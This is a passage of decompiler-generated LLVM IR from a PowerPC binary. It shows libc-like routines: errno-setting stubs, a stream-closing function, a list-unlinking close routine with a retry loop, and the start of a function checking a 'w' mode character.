dec_label_pc_100048c8:                            ; preds = %dec_label_pc_1000489c, %dec_label_pc_10004884, %dec_label_pc_100048bc
  %v0_100048cc = phi i32 [ %v0_100048ac, %dec_label_pc_1000489c ], [ %storemerge, %dec_label_pc_10004884 ], [ -1, %dec_label_pc_100048bc ]
  ret i32 %v0_100048cc

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100048c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004884, { 1, 0 }
}

define i32 @function_100048e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100048e0:
  %r31.global-to-local = alloca i32, align 4
  %v0_100048f8 = call i32 @__asm_mfcr()
  %v1_100048fc = and i32 %v0_100048f8, 268435456
  %v3_100048fc = icmp eq i32 %v1_100048fc, 0
  store i32 %v0_100048f8, i32* %r31.global-to-local, align 4
  br i1 %v3_100048fc, label %dec_label_pc_10004914, label %dec_label_pc_10004908

dec_label_pc_10004908:                            ; preds = %dec_label_pc_100048e0
  %v0_10004908 = call i32 @function_10004b48()
  %v0_1000490c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000490c = inttoptr i32 %v0_10004908 to i32*
  store i32 %v0_1000490c, i32* %v2_1000490c, align 4
  br label %dec_label_pc_10004914

dec_label_pc_10004914:                            ; preds = %dec_label_pc_100048e0, %dec_label_pc_10004908
  %v0_10004924 = phi i32 [ %v0_100048f8, %dec_label_pc_100048e0 ], [ -1, %dec_label_pc_10004908 ]
  ret i32 %v0_10004924

; uselistorder directives
  uselistorder label %dec_label_pc_10004914, { 1, 0 }
}

define i32 @function_10004928() local_unnamed_addr {
dec_label_pc_10004928:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004940 = call i32 @__asm_mfcr()
  %v1_10004944 = and i32 %v0_10004940, 268435456
  %v3_10004944 = icmp eq i32 %v1_10004944, 0
  store i32 %v0_10004940, i32* %r31.global-to-local, align 4
  br i1 %v3_10004944, label %dec_label_pc_1000495c, label %dec_label_pc_10004950

dec_label_pc_10004950:                            ; preds = %dec_label_pc_10004928
  %v0_10004950 = call i32 @function_10004b48()
  %v0_10004954 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004954 = inttoptr i32 %v0_10004950 to i32*
  store i32 %v0_10004954, i32* %v2_10004954, align 4
  br label %dec_label_pc_1000495c

dec_label_pc_1000495c:                            ; preds = %dec_label_pc_10004928, %dec_label_pc_10004950
  %v0_1000496c = phi i32 [ %v0_10004940, %dec_label_pc_10004928 ], [ -1, %dec_label_pc_10004950 ]
  ret i32 %v0_1000496c

; uselistorder directives
  uselistorder label %dec_label_pc_1000495c, { 1, 0 }
}

define i32 @function_10004970() local_unnamed_addr {
dec_label_pc_10004970:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004988 = call i32 @__asm_mfcr()
  %v1_1000498c = and i32 %v0_10004988, 268435456
  %v3_1000498c = icmp eq i32 %v1_1000498c, 0
  store i32 %v0_10004988, i32* %r31.global-to-local, align 4
  br i1 %v3_1000498c, label %dec_label_pc_100049a4, label %dec_label_pc_10004998

dec_label_pc_10004998:                            ; preds = %dec_label_pc_10004970
  %v0_10004998 = call i32 @function_10004b48()
  %v0_1000499c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000499c = inttoptr i32 %v0_10004998 to i32*
  store i32 %v0_1000499c, i32* %v2_1000499c, align 4
  br label %dec_label_pc_100049a4

dec_label_pc_100049a4:                            ; preds = %dec_label_pc_10004970, %dec_label_pc_10004998
  %v0_100049b4 = phi i32 [ %v0_10004988, %dec_label_pc_10004970 ], [ -1, %dec_label_pc_10004998 ]
  ret i32 %v0_100049b4

; uselistorder directives
  uselistorder label %dec_label_pc_100049a4, { 1, 0 }
}

define i32 @function_100049b8() local_unnamed_addr {
dec_label_pc_100049b8:
  %r31.global-to-local = alloca i32, align 4
  %v0_100049d0 = call i32 @__asm_mfcr()
  %v1_100049d4 = and i32 %v0_100049d0, 268435456
  %v3_100049d4 = icmp eq i32 %v1_100049d4, 0
  store i32 %v0_100049d0, i32* %r31.global-to-local, align 4
  br i1 %v3_100049d4, label %dec_label_pc_100049ec, label %dec_label_pc_100049e0

dec_label_pc_100049e0:                            ; preds = %dec_label_pc_100049b8
  %v0_100049e0 = call i32 @function_10004b48()
  %v0_100049e4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100049e4 = inttoptr i32 %v0_100049e0 to i32*
  store i32 %v0_100049e4, i32* %v2_100049e4, align 4
  br label %dec_label_pc_100049ec

dec_label_pc_100049ec:                            ; preds = %dec_label_pc_100049b8, %dec_label_pc_100049e0
  %v0_100049fc = phi i32 [ %v0_100049d0, %dec_label_pc_100049b8 ], [ -1, %dec_label_pc_100049e0 ]
  ret i32 %v0_100049fc

; uselistorder directives
  uselistorder label %dec_label_pc_100049ec, { 1, 0 }
}

define i32 @function_10004a00(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004a00:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004a18 = call i32 @__asm_mfcr()
  %v1_10004a1c = and i32 %v0_10004a18, 268435456
  %v3_10004a1c = icmp eq i32 %v1_10004a1c, 0
  store i32 %v0_10004a18, i32* %r31.global-to-local, align 4
  br i1 %v3_10004a1c, label %dec_label_pc_10004a34, label %dec_label_pc_10004a28

dec_label_pc_10004a28:                            ; preds = %dec_label_pc_10004a00
  %v0_10004a28 = call i32 @function_10004b48()
  %v0_10004a2c = load i32, i32* %r31.global-to-local, align 4
  %v2_10004a2c = inttoptr i32 %v0_10004a28 to i32*
  store i32 %v0_10004a2c, i32* %v2_10004a2c, align 4
  br label %dec_label_pc_10004a34

dec_label_pc_10004a34:                            ; preds = %dec_label_pc_10004a00, %dec_label_pc_10004a28
  %v0_10004a44 = phi i32 [ %v0_10004a18, %dec_label_pc_10004a00 ], [ -1, %dec_label_pc_10004a28 ]
  ret i32 %v0_10004a44

; uselistorder directives
  uselistorder label %dec_label_pc_10004a34, { 1, 0 }
}

define i32 @function_10004a48(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10004a48:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004a60 = call i32 @__asm_mfcr()
  %v1_10004a64 = and i32 %v0_10004a60, 268435456
  %v3_10004a64 = icmp eq i32 %v1_10004a64, 0
  store i32 %v0_10004a60, i32* %r31.global-to-local, align 4
  br i1 %v3_10004a64, label %dec_label_pc_10004a7c, label %dec_label_pc_10004a70

dec_label_pc_10004a70:                            ; preds = %dec_label_pc_10004a48
  %v0_10004a70 = call i32 @function_10004b48()
  %v0_10004a74 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004a74 = inttoptr i32 %v0_10004a70 to i32*
  store i32 %v0_10004a74, i32* %v2_10004a74, align 4
  br label %dec_label_pc_10004a7c

dec_label_pc_10004a7c:                            ; preds = %dec_label_pc_10004a48, %dec_label_pc_10004a70
  %v0_10004a8c = phi i32 [ %v0_10004a60, %dec_label_pc_10004a48 ], [ -1, %dec_label_pc_10004a70 ]
  ret i32 %v0_10004a8c

; uselistorder directives
  uselistorder label %dec_label_pc_10004a7c, { 1, 0 }
}

define i32 @function_10004a90(i32 %arg1) local_unnamed_addr {
dec_label_pc_10004a90:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004aa8 = call i32 @__asm_mfcr()
  %v1_10004aac = and i32 %v0_10004aa8, 268435456
  %v3_10004aac = icmp eq i32 %v1_10004aac, 0
  store i32 %v0_10004aa8, i32* %r31.global-to-local, align 4
  br i1 %v3_10004aac, label %dec_label_pc_10004ac4, label %dec_label_pc_10004ab8

dec_label_pc_10004ab8:                            ; preds = %dec_label_pc_10004a90
  %v0_10004ab8 = call i32 @function_10004b48()
  %v0_10004abc = load i32, i32* %r31.global-to-local, align 4
  %v2_10004abc = inttoptr i32 %v0_10004ab8 to i32*
  store i32 %v0_10004abc, i32* %v2_10004abc, align 4
  br label %dec_label_pc_10004ac4

dec_label_pc_10004ac4:                            ; preds = %dec_label_pc_10004a90, %dec_label_pc_10004ab8
  %v0_10004ad4 = phi i32 [ %v0_10004aa8, %dec_label_pc_10004a90 ], [ -1, %dec_label_pc_10004ab8 ]
  ret i32 %v0_10004ad4

; uselistorder directives
  uselistorder label %dec_label_pc_10004ac4, { 1, 0 }
}

define i32 @function_10004ad8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10004ad8:
  %v1_10004adc = call i32 @function_10009500(i32 0)
  ret i32 %v1_10004adc
}

define i32 @function_10004ae0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004ae0:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004af8 = call i32 @__asm_mfcr()
  %v1_10004afc = and i32 %v0_10004af8, 268435456
  %v3_10004afc = icmp eq i32 %v1_10004afc, 0
  store i32 %v0_10004af8, i32* %r31.global-to-local, align 4
  br i1 %v3_10004afc, label %dec_label_pc_10004b14, label %dec_label_pc_10004b08

dec_label_pc_10004b08:                            ; preds = %dec_label_pc_10004ae0
  %v0_10004b08 = call i32 @function_10004b48()
  %v0_10004b0c = load i32, i32* %r31.global-to-local, align 4
  %v2_10004b0c = inttoptr i32 %v0_10004b08 to i32*
  store i32 %v0_10004b0c, i32* %v2_10004b0c, align 4
  br label %dec_label_pc_10004b14

dec_label_pc_10004b14:                            ; preds = %dec_label_pc_10004ae0, %dec_label_pc_10004b08
  %v0_10004b24 = phi i32 [ %v0_10004af8, %dec_label_pc_10004ae0 ], [ -1, %dec_label_pc_10004b08 ]
  ret i32 %v0_10004b24

; uselistorder directives
  uselistorder label %dec_label_pc_10004b14, { 1, 0 }
}

define i32 @function_10004b28(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004b28:
  %v1_10004b28 = add i32 %arg1, 128
  %v1_10004b2c = mul i32 %arg1, 2
  %v2_10004b30 = icmp ugt i32 %v1_10004b28, 383
  %v0_10004b34 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10004b30, i32 %v0_10004b34)
  %v3_10004b3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1056) to i32*), align 4
  %v2_10004b40 = add i32 %v1_10004b2c, %v3_10004b3c
  %v3_10004b40 = inttoptr i32 %v2_10004b40 to i16*
  %v4_10004b40 = load i16, i16* %v3_10004b40, align 2
  %v5_10004b40 = sext i16 %v4_10004b40 to i32
  ret i32 %v5_10004b40
}

define i32 @function_10004b48() local_unnamed_addr {
dec_label_pc_10004b48:
  ret i32 ptrtoint (i32* @global_var_100104bc.193 to i32)
}

define i32 @function_10004b54(i16* %arg1) local_unnamed_addr {
dec_label_pc_10004b54:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10004b68 = add i32 %tmp, 52
  %v3_10004b68 = inttoptr i32 %v2_10004b68 to i32*
  %v4_10004b68 = load i32, i32* %v3_10004b68, align 4
  store i32 %v4_10004b68, i32* @r28, align 4
  %v3_10004b6c = icmp eq i32 %v4_10004b68, 0
  store i1 %v3_10004b6c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004b6c, label %dec_label_pc_10004b74, label %dec_label_pc_10004b94

dec_label_pc_10004b74:                            ; preds = %dec_label_pc_10004b54
  %v2_10004b7c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10004b7c, i32* @r3, align 4
  %v0_10004b88 = call i32 @function_10008c84()
  %v0_10004b90 = call i32 @function_10008c7c()
  %v0_10004b94.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004b94

dec_label_pc_10004b94:                            ; preds = %dec_label_pc_10004b54, %dec_label_pc_10004b74
  %v0_10004ba4 = phi i32 [ %tmp, %dec_label_pc_10004b54 ], [ %v0_10004b94.pre, %dec_label_pc_10004b74 ]
  %v1_10004b94 = inttoptr i32 %v0_10004ba4 to i16*
  %v2_10004b94 = load i16, i16* %v1_10004b94, align 2
  %v3_10004b94 = zext i16 %v2_10004b94 to i32
  store i32 0, i32* @r27, align 4
  %v1_10004b9c = and i32 %v3_10004b94, 64
  %v3_10004b9c = icmp eq i32 %v1_10004b9c, 0
  br i1 %v3_10004b9c, label %dec_label_pc_10004bb0, label %dec_label_pc_10004ba4

dec_label_pc_10004ba4:                            ; preds = %dec_label_pc_10004b94
  store i32 268454828, i32* @lr, align 4
  %v4_10004ba8 = call i32 @function_100068e0(i16* %v1_10004b94, i32 %v1_10004b9c)
  store i32 %v4_10004ba8, i32* @r27, align 4
  %v0_10004bb0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004bb0

dec_label_pc_10004bb0:                            ; preds = %dec_label_pc_10004b94, %dec_label_pc_10004ba4
  %v0_10004bb0 = phi i32 [ %v0_10004ba4, %dec_label_pc_10004b94 ], [ %v0_10004bb0.pre, %dec_label_pc_10004ba4 ]
  %v1_10004bb0 = add i32 %v0_10004bb0, 4
  %v2_10004bb0 = inttoptr i32 %v1_10004bb0 to i32*
  %v3_10004bb0 = load i32, i32* %v2_10004bb0, align 4
  store i32 268454840, i32* @lr, align 4
  %v1_10004bb4 = call i32 @function_100048e0(i32 %v3_10004bb0)
  %v3_10004bb8 = icmp eq i32 %v1_10004bb4, 0
  store i1 %v3_10004bb8, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10004bb4, -1
  br i1 %tmp8, label %dec_label_pc_10004bc4, label %dec_label_pc_10004bc0

dec_label_pc_10004bc0:                            ; preds = %dec_label_pc_10004bb0
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10004bc4

dec_label_pc_10004bc4:                            ; preds = %dec_label_pc_10004bb0, %dec_label_pc_10004bc0
  store i32 ptrtoint ([3 x i8]* @global_var_10008c7c.194 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.195 to i32), i32* @r29, align 4
  %v1_10004bd8 = load i32, i32* @r31, align 4
  %v2_10004bd8 = add i32 %v1_10004bd8, 4
  %v3_10004bd8 = inttoptr i32 %v2_10004bd8 to i32*
  store i32 -1, i32* %v3_10004bd8, align 4
  %v2_10004bdc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10004bdc, i32* @r30, align 4
  store i32 %v2_10004bdc, i32* @r3, align 4
  %v0_10004bec = call i32 @function_10008c84()
  %v0_10004bf4 = call i32 @function_10008c7c()
  %v3_10004bfc = load i32, i32* @global_var_10010494.196, align 4
  store i32 %v2_10004bdc, i32* @r3, align 4
  %v1_10004c08 = add i32 %v3_10004bfc, 1
  store i32 %v1_10004c08, i32* @global_var_10010494.196, align 4
  %v0_10004c10 = call i32 @function_10008c84()
  %v0_10004c14 = load i32, i32* @r31, align 4
  %v1_10004c14 = inttoptr i32 %v0_10004c14 to i16*
  %v2_10004c14 = load i16, i16* %v1_10004c14, align 2
  %v3_10004c14 = zext i16 %v2_10004c14 to i32
  %v0_10004c18 = load i32, i32* @r28, align 4
  %v3_10004c18 = icmp eq i32 %v0_10004c18, 0
  store i1 %v3_10004c18, i1* %cr7_eq.global-to-local, align 1
  %v1_10004c1c = call i32 @__asm_rlwinm(i32 %v3_10004c14, i32 0, i32 17, i32 18)
  %v1_10004c24 = or i32 %v1_10004c1c, 48
  %v1_10004c28 = trunc i32 %v1_10004c24 to i16
  %v2_10004c28 = load i32, i32* @r31, align 4
  %v3_10004c28 = inttoptr i32 %v2_10004c28 to i16*
  store i16 %v1_10004c28, i16* %v3_10004c28, align 2
  %v0_10004c2c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004c2c, label %dec_label_pc_10004c30, label %dec_label_pc_10004c3c

dec_label_pc_10004c30:                            ; preds = %dec_label_pc_10004bc4
  %v2_10004c30 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10004c30, i32* @r3, align 4
  %v0_10004c38 = call i32 @function_10008c84()
  br label %dec_label_pc_10004c3c

dec_label_pc_10004c3c:                            ; preds = %dec_label_pc_10004bc4, %dec_label_pc_10004c30
  %v0_10004c3c = load i32, i32* @r31, align 4
  %v1_10004c3c = inttoptr i32 %v0_10004c3c to i16*
  %v2_10004c3c = load i16, i16* %v1_10004c3c, align 2
  %v1_10004c40 = and i16 %v2_10004c3c, 16384
  %v3_10004c40 = icmp eq i16 %v1_10004c40, 0
  br i1 %v3_10004c40, label %dec_label_pc_10004c50, label %dec_label_pc_10004c48

dec_label_pc_10004c48:                            ; preds = %dec_label_pc_10004c3c
  %v1_10004c48 = add i32 %v0_10004c3c, 8
  %v2_10004c48 = inttoptr i32 %v1_10004c48 to i32*
  %v3_10004c48 = load i32, i32* %v2_10004c48, align 4
  store i32 268454992, i32* @lr, align 4
  %v1_10004c4c = call i32 @function_10007e48(i32 %v3_10004c48)
  br label %dec_label_pc_10004c50

dec_label_pc_10004c50:                            ; preds = %dec_label_pc_10004c3c, %dec_label_pc_10004c48
  store i32 %v2_10004bdc, i32* @r3, align 4
  %v0_10004c5c = call i32 @function_10008c84()
  %v0_10004c64 = call i32 @function_10008c7c()
  %v3_10004c6c = load i32, i32* @global_var_10010498.197, align 4
  store i32 %v2_10004bdc, i32* @r3, align 4
  %v1_10004c78 = add i32 %v3_10004c6c, 1
  store i32 %v1_10004c78, i32* @global_var_10010498.197, align 4
  %v0_10004c80 = call i32 @function_10008c84()
  store i32 268455048, i32* @lr, align 4
  %v0_10004c84 = call i32 @function_100067c0()
  %v0_10004c8c = load i32, i32* @r27, align 4
  ret i32 %v0_10004c8c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10004c50, { 1, 0 }
  uselistorder label %dec_label_pc_10004c3c, { 1, 0 }
  uselistorder label %dec_label_pc_10004bc4, { 1, 0 }
  uselistorder label %dec_label_pc_10004bb0, { 1, 0 }
  uselistorder label %dec_label_pc_10004b94, { 1, 0 }
}

define i32 @function_10004ca0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004ca0:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10004ca8 = call i32 @function_10005144(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10004ca8
}

define i32 @function_10004cac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004cac:
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 -1, i32* @r4, align 4
  %v0_10004cb8 = call i32 @function_10004d48()
  ret i32 %v0_10004cb8
}

define i32 @function_10004cbc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004cbc:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_10004cdc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10004cdc, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10004d2c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10004d2c, i32* %stack_var_-96, align 4
  store i32 268455224, i32* @lr, align 4
  %v0_10004d34 = call i32 @function_10004d48()
  ret i32 %v0_10004d34
}

define i32 @function_10004d48() local_unnamed_addr {
dec_label_pc_10004d48:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10004d54 = load i32, i32* @r4, align 4
  store i32 %v0_10004d54, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_10004d70 = load i32, i32* @r3, align 4
  %v1_10004d70 = sub i32 -1, %v0_10004d70
  store i32 %v1_10004d70, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10004d70, i32* %r31.global-to-local, align 4
  %v2_10004d84 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10004d84, i32* @r3, align 4
  %v0_10004d88 = load i32, i32* @r5, align 4
  store i32 %v0_10004d88, i32* %r29.global-to-local, align 4
  %v0_10004d8c = load i32, i32* @r6, align 4
  store i32 %v0_10004d8c, i32* @r28, align 4
  store i32 268455324, i32* @lr, align 4
  %v0_10004d98 = call i32 @function_10005474()
  %v0_10004d9c = load i32, i32* %r30.global-to-local, align 4
  %v1_10004d9c = load i32, i32* @r27, align 4
  %v3_10004d9c = icmp ugt i32 %v0_10004d9c, %v1_10004d9c
  %v0_10004da0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10004da0, i32* @r4, align 4
  %v0_10004da4 = load i32, i32* @r28, align 4
  store i32 %v0_10004da4, i32* @r5, align 4
  %v2_10004da8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10004da8, i32* @r3, align 4
  br i1 %v3_10004d9c, label %dec_label_pc_10004db4, label %dec_label_pc_10004db8

dec_label_pc_10004db4:                            ; preds = %dec_label_pc_10004d48
  store i32 %v1_10004d9c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10004db8

dec_label_pc_10004db8:                            ; preds = %dec_label_pc_10004d48, %dec_label_pc_10004db4
  %v1_10004db8 = phi i32 [ %v0_10004d9c, %dec_label_pc_10004d48 ], [ %v1_10004d9c, %dec_label_pc_10004db4 ]
  %v0_10004db8 = load i32, i32* %r31.global-to-local, align 4
  store i32 268455384, i32* @lr, align 4
  %v0_10004dd4 = call i32 @function_10005694()
  %v0_10004dd8 = load i32, i32* @r30, align 4
  %v3_10004dd8 = icmp eq i32 %v0_10004dd8, 0
  br i1 %v3_10004dd8, label %dec_label_pc_10004e00, label %dec_label_pc_10004de0

dec_label_pc_10004de0:                            ; preds = %dec_label_pc_10004db8
  %v4_10004dec = icmp eq i32 %v1_10004db8, 0
  %v1_10004de8 = sext i1 %v4_10004dec to i32
  %v0_10004df4.v0_10004db8 = add i32 %v0_10004db8, %v1_10004de8
  %stack_var_-88.0 = inttoptr i32 %v0_10004df4.v0_10004db8 to i8*
  %v0_10004dfc = load i32, i32* @r26, align 4
  %v1_10004dfc = trunc i32 %v0_10004dfc to i8
  store i8 %v1_10004dfc, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_10004e00

dec_label_pc_10004e00:                            ; preds = %dec_label_pc_10004db8, %dec_label_pc_10004de0
  ret i32 %v0_10004dd4

; uselistorder directives
  uselistorder i32 %v0_10004d70, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_10004e00, { 1, 0 }
  uselistorder label %dec_label_pc_10004db8, { 1, 0 }
}

define i32 @function_10004e14(i32 %arg1) local_unnamed_addr {
dec_label_pc_10004e14:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.199 to i32), i32* %r29.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v2_10004e38 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10004e38, i32* @r3, align 4
  %v0_10004e40 = call i32 @function_10008c84()
  %v0_10004e48 = call i32 @function_10008c7c()
  %v3_10004e50 = load i32, i32* @global_var_10010490.200, align 4
  store i32 %v3_10004e50, i32* %r29.global-to-local, align 4
  %v3_10004e54 = icmp eq i32 %v3_10004e50, 0
  br i1 %v3_10004e54, label %dec_label_pc_10004eb0, label %dec_label_pc_10004e5c

dec_label_pc_10004e5c:                            ; preds = %dec_label_pc_10004e14
  %v1_10004e5c = add i32 %v3_10004e50, 4
  %v2_10004e5c = inttoptr i32 %v1_10004e5c to i32*
  %v3_10004e5c = load i32, i32* %v2_10004e5c, align 4
  %v1_10004e60 = load i32, i32* @r31, align 4
  %v4_10004e60 = icmp eq i32 %v3_10004e5c, %v1_10004e60
  br i1 %v4_10004e60, label %dec_label_pc_10004e68, label %dec_label_pc_10004e8c

dec_label_pc_10004e68:                            ; preds = %dec_label_pc_10004e5c
  %v1_10004e68 = inttoptr i32 %v3_10004e50 to i32*
  %v2_10004e68 = load i32, i32* %v1_10004e68, align 4
  store i32 %v2_10004e68, i32* @global_var_10010490.200, align 4
  br label %dec_label_pc_10004eb0

dec_label_pc_10004e74:                            ; preds = %dec_label_pc_10004e8c
  %v0_10004e74 = call i32 @function_10004b48()
  %v2_10004e7c = inttoptr i32 %v0_10004e74 to i32*
  store i32 22, i32* %v2_10004e7c, align 4
  br label %dec_label_pc_10004eb0

dec_label_pc_10004e84:                            ; preds = %dec_label_pc_10004ed8
  %v3_10004e84 = load i32, i32* %stack_var_-56, align 4
  br label %dec_label_pc_10004f04

dec_label_pc_10004e8c:                            ; preds = %dec_label_pc_10004e5c, %dec_label_pc_10004e9c
  %v1_10004eac = phi i32 [ %v2_10004e90, %dec_label_pc_10004e9c ], [ %v3_10004e50, %dec_label_pc_10004e5c ]
  %v1_10004e90 = inttoptr i32 %v1_10004eac to i32*
  %v2_10004e90 = load i32, i32* %v1_10004e90, align 4
  store i32 %v2_10004e90, i32* %r29.global-to-local, align 4
  %v3_10004e94 = icmp eq i32 %v2_10004e90, 0
  br i1 %v3_10004e94, label %dec_label_pc_10004e74, label %dec_label_pc_10004e9c

dec_label_pc_10004e9c:                            ; preds = %dec_label_pc_10004e8c
  %v1_10004e9c = add i32 %v2_10004e90, 4
  %v2_10004e9c = inttoptr i32 %v1_10004e9c to i32*
  %v3_10004e9c = load i32, i32* %v2_10004e9c, align 4
  %v4_10004ea0 = icmp eq i32 %v3_10004e9c, %v1_10004e60
  br i1 %v4_10004ea0, label %dec_label_pc_10004ea8, label %dec_label_pc_10004e8c

dec_label_pc_10004ea8:                            ; preds = %dec_label_pc_10004e9c
  %v1_10004ea8 = inttoptr i32 %v2_10004e90 to i32*
  %v2_10004ea8 = load i32, i32* %v1_10004ea8, align 4
  store i32 %v2_10004ea8, i32* %v1_10004e90, align 4
  br label %dec_label_pc_10004eb0

dec_label_pc_10004eb0:                            ; preds = %dec_label_pc_10004e14, %dec_label_pc_10004e74, %dec_label_pc_10004e68, %dec_label_pc_10004ea8
  store i32 %v2_10004e38, i32* @r3, align 4
  %v0_10004eb8 = call i32 @function_10008c84()
  %v0_10004ebc = load i32, i32* %r29.global-to-local, align 4
  %v3_10004ebc = icmp eq i32 %v0_10004ebc, 0
  br i1 %v3_10004ebc, label %dec_label_pc_10004f04, label %dec_label_pc_10004ec4

dec_label_pc_10004ec4:                            ; preds = %dec_label_pc_10004eb0
  %v1_10004ec8 = add i32 %v0_10004ebc, 8
  %v2_10004ec8 = inttoptr i32 %v1_10004ec8 to i32*
  %v3_10004ec8 = load i32, i32* %v2_10004ec8, align 4
  store i32 %v3_10004ec8, i32* %r29.global-to-local, align 4
  store i32 268455632, i32* @lr, align 4
  %v1_10004ecc = call i32 @function_10007e48(i32 %v0_10004ebc)
  %v0_10004ed0 = load i32, i32* @r31, align 4
  store i32 268455640, i32* @lr, align 4
  %v1_10004ed4 = inttoptr i32 %v0_10004ed0 to i16*
  %v2_10004ed4 = call i32 @function_10004b54(i16* %v1_10004ed4)
  %v2_10004ed8 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_10004ed8

dec_label_pc_10004ed8:                            ; preds = %dec_label_pc_10004ef0, %dec_label_pc_10004ec4
  %v0_10004ee0 = load i32, i32* @r29, align 4
  store i32 268455656, i32* @lr, align 4
  %v3_10004ee4 = call i32 @function_10004ad8(i32 %v0_10004ee0, i32 %v2_10004ed8, i32 0)
  %tmp8 = icmp sgt i32 %v3_10004ee4, -1
  br i1 %tmp8, label %dec_label_pc_10004e84, label %dec_label_pc_10004ef0

dec_label_pc_10004ef0:                            ; preds = %dec_label_pc_10004ed8
  %v0_10004ef0 = call i32 @function_10004b48()
  %v1_10004ef4 = inttoptr i32 %v0_10004ef0 to i32*
  %v2_10004ef4 = load i32, i32* %v1_10004ef4, align 4
  %v3_10004ef8 = icmp eq i32 %v2_10004ef4, 4
  br i1 %v3_10004ef8, label %dec_label_pc_10004ed8, label %dec_label_pc_10004f04

dec_label_pc_10004f04:                            ; preds = %dec_label_pc_10004ef0, %dec_label_pc_10004eb0, %dec_label_pc_10004e84
  %storemerge = phi i32 [ %v3_10004e84, %dec_label_pc_10004e84 ], [ -1, %dec_label_pc_10004eb0 ], [ -1, %dec_label_pc_10004ef0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10004ebc, { 1, 0, 2 }
  uselistorder i32 %v2_10004e90, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_10004eb0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10004e8c, { 1, 0 }
}

define i32 @function_10004f18(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10004f18:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_10004f2c = load i8, i8* %arg2, align 1
  %v3_10004f34 = icmp eq i8 %v3_10004f2c, 119
  br i1 %v3_10004f34, label %dec_label_pc_10004f64, label %dec_label_pc_10004f3c

dec_label_pc_10004f3c:                            ; preds = %dec_label_pc_10004f18
